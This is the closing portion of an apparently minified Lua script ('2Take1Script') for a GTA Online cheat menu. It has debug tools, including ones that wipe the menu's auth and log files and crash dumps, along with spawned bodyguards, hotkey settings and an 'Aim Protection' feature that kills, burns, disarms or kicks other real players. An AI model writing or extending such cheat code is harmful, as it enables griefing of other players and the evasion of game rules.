                    f7 = entity.get_entity_model_hash(dy)
                    bp = entity.get_entity_coords(dy)
                    cY = entity.get_entity_rotation(dy)
                    s("")
                    s("Printing infos about Entity:")
                    s("******************************")
                    s("Hash: " .. f7)
                    s("Entity Type: " .. entity.get_entity_type(dy))
                    s("Entity: " .. dy)
                    s("Coords X: " .. bp.x)
                    s("Coords Y: " .. bp.y)
                    s("Coords Z: " .. bp.z)
                    s("Rot X: " .. cY.x)
                    s("Rot Y: " .. cY.y)
                    s("Rot Z: " .. cY.z)
                    s("Heading: " .. entity.get_entity_heading(dy))
                    s("Entity population_type: " .. entity.get_entity_population_type(dy))
                    if entity.is_entity_static(dy) then
                        s("Entity is static")
                    end
                    if entity.does_entity_have_drawable(dy) then
                        s("Entity has a drawable")
                    end
                    if entity.is_entity_in_water(dy) then
                        s("Entity is in water")
                    end
                    if entity.is_entity_a_ped(dy) then
                        s("Entity is a PED")
                    elseif entity.is_entity_a_vehicle(dy) then
                        s("Entity is a VEHICLE")
                    elseif entity.is_entity_an_object(dy) then
                        s("Entity is a OBJECT")
                    end
                    if entity.is_entity_dead(dy) then
                        s("Entity is DEAD")
                    end
                    if entity.is_entity_on_fire(dy) then
                        s("Entity is ON FIRE")
                    end
                    if entity.is_entity_visible(dy) then
                        s("Entity is VISIBLE")
                    else
                        s("Entity is INvisible")
                    end
                    if entity.is_entity_attached(dy) then
                        dy = entity.get_entity_attached_to(dy)
                        s("")
                        s("Attached Entity found. Continue printing infos of Entity.")
                        s("Attached Entity Info:")
                    else
                        dy = 0
                        s("")
                        s("")
                        s("")
                    end
                end
                o("Printed Info about Entity to file.")
            else
                o("Nothing found for Info-Printing.")
            end
        end
    )
    bb(
        "Clear 2Take1Script.log",
        aj["debug"],
        function()
            local f8 = c.o(b["Log_file"], "w")
            io.close(f8)
            o("Cleared 2Take1Script.log", 204)
            s("Cleared 2Take1Script.log")
        end
    )
    bb(
        "Clear Menu Log-Files",
        aj["debug"],
        function()
            local f8 = c.o(b["Auth"], "w")
            io.close(f8)
            o("Cleared PopstarAuth.log", 204)
            s("Cleared PopstarAuth.log")
            f8 = c.o(b["Menu_log"], "w")
            io.close(f8)
            o("Cleared 2Take1Menu.log", 204)
            s("Cleared 2Take1Menu.log")
            f8 = c.o(b["Prep"], "w")
            io.close(f8)
            o("Cleared 2Take1Prep.log", 204)
            s("Cleared 2Take1Prep.log")
        end
    )
    bb(
        "Clear crashdumps",
        aj["debug"],
        function()
            local f9 = utils.get_all_files_in_directory(a["dumps"], "dump")
            if f9[1] ~= nil then
                o("Found dumps, deleting...", 204)
                for i = 1, #f9 do
                    os.remove(a["dumps"] .. "\\" .. f9[i])
                end
                o("Cleared crashdumps.", 204)
                s("Cleared crashdumps.")
            else
                o("No dumps found.", 204)
            end
        end
    )
    ak["log_modder_flags"] =
        bc(
        "Log Modder Flags",
        aj["debug"],
        function(k)
            if k.on then
                local time = c.time() + 2500
                while time > c.time() do
                    c.wait(250)
                    l["log_modder_flags"] = k.on
                end
                for i = 0, 31 do
                    if c.valid(i) then
                        for F = 1, #v do
                            if player.is_player_modder(i, v[F]) then
                                local cS = v[F]
                                local f = player.get_modder_flag_text(cS)
                                if b2[K.scid(i)] then
                                    if not b2[K.scid(i)][cS] then
                                        b2[K.scid(i)][cS] = true
                                        s(K.scid(i) .. ":" .. K.name(i) .. " is a Modder with Tag: " .. f)
                                    end
                                else
                                    b2[K.scid(i)] = {}
                                end
                            end
                        end
                    end
                end
            end
            l["log_modder_flags"] = k.on
            return d.stop(k)
        end
    )
    ak["log_modder_flags"].on = l["log_modder_flags"]
    ak["logger"] =
        bc(
        "Enable Log from this Lua-Script",
        aj["debug"],
        function(k)
            l["logger"] = k.on
        end
    )
    ak["logger"].on = l["logger"]
    aj["bodyguards"] = b8("Bodyguards", aj["parent"])
    aj["bodyguards"].hidden = l["bodyguards_hidden"]
    aj["bodyguards"] = aj["bodyguards"].id
    ak["bodyguards_god"] =
        bc(
        "Godmode for Bodyguards",
        aj["bodyguards"],
        function(k)
            l["bodyguards_god"] = k.on
        end
    )
    ak["bodyguards_god"].on = l["bodyguards_god"]
    ak["bodyguards_health"] =
        bd(
        "Set Health of Bodyguards",
        "autoaction_value_i",
        aj["bodyguards"],
        function(k)
            o("Bodyguards Health set to: " .. k.value_i)
            l["bodyguards_health"] = k.value_i
        end
    )
    ak["bodyguards_health"].min_i = 5000
    ak["bodyguards_health"].max_i = 50000
    ak["bodyguards_health"].mod_i = 5000
    ak["bodyguards_health"].value_i = l["bodyguards_health"]
    ak["bodyguards_equip_weapon"] =
        bc(
        "Equip Bodyguards with MG",
        aj["bodyguards"],
        function(k)
            l["bodyguards_equip_weapon"] = k.on
        end
    )
    ak["bodyguards_equip_weapon"].on = l["bodyguards_equip_weapon"]
    ak["bodyguards_formation"] =
        bd(
        "Set Formation",
        "autoaction_value_i",
        aj["bodyguards"],
        function(k)
            l["bodyguards_formation_type"] = k.value_i
        end
    )
    ak["bodyguards_formation"].min_i = 0
    ak["bodyguards_formation"].max_i = 3
    ak["bodyguards_formation"].value_i = l["bodyguards_formation_type"]
    ak["bodyguards"] =
        bc(
        "Enable Bodyguards",
        aj["bodyguards"],
        function(k)
            if k.on then
                local fa = player.get_player_group(c.id())
                local cf = 0x613E626C
                for i = 1, 7 do
                    if a0["bodyguards"][i] == nil or entity.is_entity_dead(a0["bodyguards"][i]) then
                        if a0["bodyguards"][i] ~= nil and entity.is_entity_dead(a0["bodyguards"][i]) then
                            bk({a0["bodyguards"][i]})
                        end
                        I.model(cf)
                        a0["bodyguards"][i] = ped.create_ped(29, cf, bZ(M.coords(), M.heading(), 4), 0, true, false)
                        c.unload(cf)
                        if ak["bodyguards_god"].on then
                            entity.set_entity_god_mode(a0["bodyguards"][i], true)
                        else
                            ped.set_ped_max_health(a0["bodyguards"][i], ak["bodyguards_health"].value_i)
                            ped.set_ped_health(a0["bodyguards"][i], ak["bodyguards_health"].value_i)
                        end
                        local fb = ui.add_blip_for_entity(a0["bodyguards"][i])
                        ui.set_blip_sprite(fb, 310)
                        ui.set_blip_colour(fb, 80)
                        if ak["bodyguards_equip_weapon"].on then
                            weapon.give_delayed_weapon_to.ped(a0["bodyguards"][i], 0x22D8FE39, 0, 1)
                            weapon.give_delayed_weapon_to.ped(a0["bodyguards"][i], 0xDBBD7280, 0, 1)
                        end
                        ped.set_ped_combat_ability(a0["bodyguards"][i], 100)
                        ped.set_ped_as_group_member(a0["bodyguards"][i], fa)
                        entity.set_entity_as_mission_entity(a0["bodyguards"][i], 1, 1)
                    end
                    if not entity.is_entity_dead(a0["bodyguards"][i]) then
                        I.ctrl(a0["bodyguards"][i])
                        ped.set_group_formation(fa, ak["bodyguards_formation"].value_i)
                        if player.is_player_free_aiming(c.id()) then
                            local ca = player.get_entity_player_is_aiming_at(c.id())
                            if ca ~= 0 then
                                ai.task_shoot_at_entity(a0["bodyguards"][i], ca, 100, 0xC6EE6B4C)
                            else
                                local bp = M.coords()
                                local dK = cam.get_gameplay_cam_rot()
                                dK:transformRotToDir()
                                dK = dK * c.random(1, 50)
                                bp = bp + dK
                                ai.task_shoot_gun_at_coord(a0["bodyguards"][i], bp, 100, 0xC6EE6B4C)
                            end
                        end
                        if M.coords():magnitude(c.gcoords(a0["bodyguards"][i])) > 50 then
                            bj(a0["bodyguards"][i], bZ(M.coords(), M.heading(), -5))
                        end
                    end
                end
            end
            if not k.on then
                bk(a0["bodyguards"])
                a0["bodyguards"] = {}
            end
            return d.stop(k)
        end
    )
    aj["aim_protection"] = b8("Aim Protection", aj["parent"]).id
    ak["enable_aim_prot"] =
        bc(
        "Enable Aim Protection",
        aj["aim_protection"],
        function(k)
            if k.on then
                for i = 0, 31 do
                    if N.i(i) then
                        local ca = player.get_entity_player_is_aiming_at(i)
                        if ca ~= 0 then
                            if ca == M.ped() then
                                o(K.name(i) .. " is aiming at you!", 173)
                                local cd = M.ped()
                                if l["anonymous_punishment"] then
                                    cd = c.ped(i)
                                end
                                if l["aim_prot_ragdoll"] then
                                    o("Ragdolling " .. K.name(i) .. "!", 173)
                                    s("Ragdolling " .. K.name(i) .. "!")
                                    fire.add_explosion(c.gcoords(c.ped(i)), 70, true, false, 1, cd)
                                    c.wait(75)
                                end
                                if l["aim_prot_fire"] then
                                    o("Setting " .. K.name(i) .. " on fire!", 173)
                                    s("Setting " .. K.name(i) .. " on fire!")
                                    fire.add_explosion(c.gcoords(c.ped(i)), 3, true, false, 0, cd)
                                    c.wait(75)
                                end
                                if l["aim_prot_kill"] then
                                    o("Killing " .. K.name(i) .. "!", 173)
                                    s("Killing " .. K.name(i) .. "!")
                                    fire.add_explosion(c.gcoords(c.ped(i)), 8, false, true, 0, cd)
                                    c.wait(75)
                                end
                                if l["aim_prot_remove_weapon"] then
                                    o("Removing Weapon from " .. K.name(i) .. "!", 173)
                                    s("Removing Weapon from " .. K.name(i) .. "!")
                                    ped.set_ped_can_switch_weapons(c.ped(i), false)
                                    weapon.remove_weapon_from_ped(c.ped(i), ped.get_current_ped_weapon(c.ped(i)))
                                    ped.set_ped_can_switch_weapons(c.ped(i), false)
                                    c.wait(75)
                                end
                                if l["aim_prot_kick"] then
                                    bG(false, i)
                                end
                            end
                        end
                    end
                end
            end
            l["enable_aim_prot"] = k.on
            return d.stop(k)
        end
    )
    ak["enable_aim_prot"].on = l["enable_aim_prot"]
    ak["anonymous_punishment"] =
        bc(
        "Anonymous Punishment",
        aj["aim_protection"],
        function(k)
            l["anonymous_punishment"] = k.on
        end
    )
    ak["anonymous_punishment"].on = l["anonymous_punishment"]
    ak["aim_prot_ragdoll"] =
        bc(
        "Ragdoll Player",
        aj["aim_protection"],
        function(k)
            l["aim_prot_ragdoll"] = k.on
        end
    )
    ak["aim_prot_ragdoll"].on = l["aim_prot_ragdoll"]
    ak["aim_prot_fire"] =
        bc(
        "Set on Fire",
        aj["aim_protection"],
        function(k)
            l["aim_prot_fire"] = k.on
        end
    )
    ak["aim_prot_fire"].on = l["aim_prot_fire"]
    ak["aim_prot_kill"] =
        bc(
        "Kill Player",
        aj["aim_protection"],
        function(k)
            l["aim_prot_kill"] = k.on
        end
    )
    ak["aim_prot_kill"].on = l["aim_prot_kill"]
    ak["aim_prot_remove_weapon"] =
        bc(
        "Remove Current Weapon",
        aj["aim_protection"],
        function(k)
            l["aim_prot_remove_weapon"] = k.on
        end
    )
    ak["aim_prot_remove_weapon"].on = l["aim_prot_remove_weapon"]
    ak["aim_prot_kick"] =
        bc(
        "Kick Player",
        aj["aim_protection"],
        function(k)
            l["aim_prot_kick"] = k.on
        end
    )
    ak["aim_prot_kick"].on = l["aim_prot_kick"]
    aj["opt"] = b8("Options", aj["parent"])
    aj["opt"].hidden = l["options_hidden"]
    aj["opt"] = aj["opt"].id
    aj["hotkeys"] = b8("Hotkey Settings", aj["opt"]).id
    ak["enable_hotkeys"] =
        bc(
        "Enable Hotkeys",
        aj["hotkeys"],
        function(k)
            l["enable_hotkeys"] = k.on
            if k.on then
                if not utils.file_exists(b["Hotkeys"]) then
                    local fc = c.o(b["Hotkeys"], "w")
                    io.output(fc)
                    io.write("version=" .. l["version"] .. "\n")
                    for i = 1, #m[0] do
                        io.write(m[0][i] .. "=" .. tostring(m[m[0][i]]) .. "\n")
                    end
                    io.write("################################\n")
                    io.write(
                        "#There are more valid Keys, but i wont list them. Currently its not supported to push 2 Keys for 1 Hotkey.\n"
                    )
                    io.write("#Example valid Hotkeys:\n")
                    io.write("#F1-F12\n")
                    io.write("#A-Z\n")
                    io.write("#LCONTROL\n")
                    io.write("#RSHIFT\n")
                    io.write("#Insert\n")
                    io.write("#Down\n")
                    io.write("#PageDown\n")
                    io.close(fc)
                    o(
                        "Created 2Take1Hotkeys.ini file in folder '2Take1Script/Config'. Edit Hotkeys and reload Hotkeys.ini file.",
                        86
                    )
                end
                for i = 1, #m[0] do
                    local fd = m[0][i]
                    local fe = m[fd]
                    if fe ~= "none" then
                        local H = MenuKey()
                        H:push_str(fe)
                        if H:is_down() then
                            local cT = ak[fd]
                            local ff = cT.name
                            s(fe .. ":'" .. ff .. "' got pressed.")
                            if l["hotkey_notification"] then
                                o(fe .. ":'" .. ff .. "' got pressed.", 86)
                            end
                            if cT.type == 512 then
                                cT.on = true
                                c.wait(100)
                                cT.on = false
                            else
                                if cT.on then
                                    cT.on = false
                                else
                                    cT.on = true
                                end
                            end
                            c.wait(250)
                        end
                    end
                end
            end
            return d.stop(k)
        end
    )
    ak["enable_hotkeys"].on = l["enable_hotkeys"]
    bb(
        "Reload 2Take1Hotkeys.ini",
        aj["hotkeys"],
        function()
            x.hotkeys()
            o("Reloaded Hotkeys.ini", 86)
        end
    )
    ak["hotkey_notification"] =
        bc(
        "Hotkey Notifications",
        aj["hotkeys"],
        function(k)
            l["hotkey_notification"] = k.on
        end
    )
    ak["hotkey_notification"].on = l["hotkey_notification"]
    bb(
        "Print active Hotkeys",
        aj["hotkeys"],
        function()
            for i = 1, #m[0] do
                local H = m[0][i]
                if m[H] ~= "none" then
                    o(m[H] .. ': "' .. ak[H].name .. '"', 86)
                end
            end
        end
    )
    aj["mwh"] = b8("Menu-Wide-Hotkeys", aj["opt"]).id
    local fg = {}
    local fh = {}
    local fi = {}
    local fj = c.o(b["Exclude"], "r")
    if fj ~= nil then
        for fk in io.lines(b["Exclude"]) do
            if string.find(fk, ";", 1) == nil then
                fi[#fi + 1] = fk
            end
        end
        io.close(fj)
    end
    ak["mwh_notify"] =
        bc(
        "Menu-Wide Hotkey Notifications",
        aj["mwh"],
        function(k)
            if k.on then
                if #fg == 0 then
                    local G = c.o(a["Menu"] .. "\\2Take1Menu.ini", "r")
                    if G ~= nil then
                        local i = 1
                        for fk in io.lines(a["Menu"] .. "\\2Take1Menu.ini") do
                            if i > 1 and i < 50 then
                                local D = ""
                                while string.find(fk, "=", 1) ~= nil do
                                    D = D .. string.sub(fk, 1, 1)
                                    fk = string.sub(fk, 2)
                                end
                                D = string.sub(D, 1, #D - 1)
                                if string.find(fk, "NOMOD+", 1) ~= nil then
                                    fk = string.gsub(fk, "NOMOD*+", "")
                                end
                                fg[i - 1] = fk
                                fh[i - 1] = D
                            end
                            i = i + 1
                        end
                        io.close(G)
                    end
                end
                for i = 1, #fg do
                    local fe = fg[i]
                    local fl = fh[i]
                    local P = fe ~= "none"
                    local fm = true
                    if l["mwh_exclude_navigation"] then
                        if string.find(fl, "Menu", 1) ~= nil then
                            fm = false
                        end
                    end
                    if l["mwh_exclude_noclip"] then
                        if string.find(fl, "NoClip", 1) ~= nil then
                            fm = false
                        end
                    end
                    if l["mwh_exclude_editorrot"] then
                        if string.find(fl, "EditorRot", 1) ~= nil then
                            fm = false
                        end
                    end
                    if l["mwh_exclude_file"] then
                        for F = 1, #fi do
                            if string.find(fl, fi[F], 1) ~= nil then
                                fm = false
                            end
                        end
                    end
                    if P and fm then
                        local H = MenuKey()
                        H:push_str(fe)
                        if H:is_down() then
                            o(fe .. ":'" .. fl .. "' got pressed.", 86)
                            c.wait(250)
                        end
                    end
                end
            end
            l["mwh_notify"] = k.on
            return d.stop(k)
        end
    )
    ak["mwh_notify"].on = l["mwh_notify"]
    ak["mwh_exclude_navigation"] =
        bc(
        "Exclude Navigation Keys",
        aj["mwh"],
        function(k)
            l["mwh_exclude_navigation"] = k.on
        end
    )
    ak["mwh_exclude_navigation"].on = l["mwh_exclude_navigation"]
    ak["mwh_exclude_noclip"] =
        bc(
        "Exclude NoClip Keys",
        aj["mwh"],
        function(k)
            l["mwh_exclude_noclip"] = k.on
        end
    )
    ak["mwh_exclude_noclip"].on = l["mwh_exclude_noclip"]
    ak["mwh_exclude_editorrot"] =
        bc(
        "Exclude EditorRotation Keys",
        aj["mwh"],
        function(k)
            l["mwh_exclude_editorrot"] = k.on
        end
    )
    ak["mwh_exclude_editorrot"].on = l["mwh_exclude_editorrot"]
    ak["mwh_exclude_file"] =
        bc(
        "Exclude Keys from File",
        aj["mwh"],
        function(k)
            if not utils.file_exists(b["Exclude"]) then
                local f8 = c.o(b["Exclude"], "a")
                io.output(f8)
                io.write(";Write down each Hotkey from 2Take1Menu.ini file which should not get a notify.\n")
                io.write(';Example, the "Exit" Hotkey should not get a notify, then just add it here.\n')
                io.write(";Each excluded hotkey gets a single line:\n")
                io.write("Exit")
                io.close(f8)
                o(
                    "Edit '2Take1Exclude.ini' to exclude specific hotkeys. The file is found in '2Take1Script/Config'",
                    86
                )
            end
            l["mwh_exclude_file"] = k.on
        end
    )
    ak["mwh_exclude_file"].on = l["mwh_exclude_file"]
    bb(
        "Reload 2Take1Exclude.ini",
        aj["mwh"],
        function()
            local fj = c.o(b["Exclude"], "r")
            if fj ~= nil then
                fi = {}
                for fk in io.lines(b["Exclude"]) do
                    if string.find(fk, ";", 1) == nil then
                        fi[#fi + 1] = fk
                    end
                end
                io.close(fj)
                o("Reloaded Exclude Hotkeys.", 86)
            end
        end
    )
    ak["exclude_friends"] =
        bc(
        "Exclude Friends from Harmful Lobby Events",
        aj["opt"],
        function(k)
            l["exclude_friends"] = k.on
        end
    )
    ak["exclude_friends"].on = l["exclude_friends"]
    ak["attach_no_colision"] =
        bc(
        "Attached Entitys No Collision",
        aj["opt"],
        function(k)
            l["attach_no_colision"] = k.on
        end
    )
    ak["attach_no_colision"].on = l["attach_no_colision"]
    ak["continuously_assassins"] =
        bc(
        "Continuously Assassin Peds",
        aj["opt"],
        function(k)
            l["continuously_assassins"] = k.on
            if k.on and #a0["peds"] > 0 then
                if K.scid(aF) ~= -1 then
                    local ca = c.ped(aF)
                    for i = 1, #a0["peds"] do
                        ai.task_goto_entity(a0["peds"][i], ca, 10, 500, 500)
                        ai.task_combat_ped(a0["peds"][i], ca, 0, 16)
                    end
                end
            end
            return d.stop(k)
        end
    )
    ak["continuously_assassins"].on = l["continuously_assassins"]
    ak["disable_history"] =
        bc(
        "Disable Player-History",
        aj["opt"],
        function(k)
            l["disable_history"] = k.on
        end
    )
    ak["override_notify_color"] =
        bd(
        "Force Notification Color",
        "value_i",
        aj["opt"],
        function(k)
            l["override_notify_color"] = k.on
            l["notify_color"] = k.value_i
        end
    )
    ak["override_notify_color"].max_i = 223
    ak["override_notify_color"].on = l["override_notify_color"]
    ak["override_notify_color"].value_i = l["notify_color"]
    bb(
        "Show Notification Color",
        aj["opt"],
        function()
            o("Example Text\nNotification color: " .. l["notify_color"])
        end
    )
    ak["2t1s_parent"] =
        bc(
        "2Take1Script Parent",
        aj["opt"],
        function(k)
            l["2t1s_parent"] = k.on
        end
    )
    ak["2t1s_parent"].on = l["2t1s_parent"]
    ak["save_config"] =
        bb(
        "Save Configuration",
        aj["opt"],
        function()
            local G = c.o(b["Config"], "w+")
            io.output(G)
            for i = 1, #l[0] do
                local D = l[0][i]
                if string.find(D, "section", 1) == nil then
                    io.write(D .. "=" .. tostring(l[D]) .. "\n")
                else
                    io.write(tostring(l[D]) .. "\n")
                end
            end
            io.close(G)
            s("Saved Configuration to file.")
            o("Saved Configuration to file.", 25)
        end
    )
    s("")
    s("")
    s("Loaded 2Take1Script successfully. :)")
    s("")
    o("2Take1Script successfully loaded. :)", 210)
    _2t1s = true
end
d5()
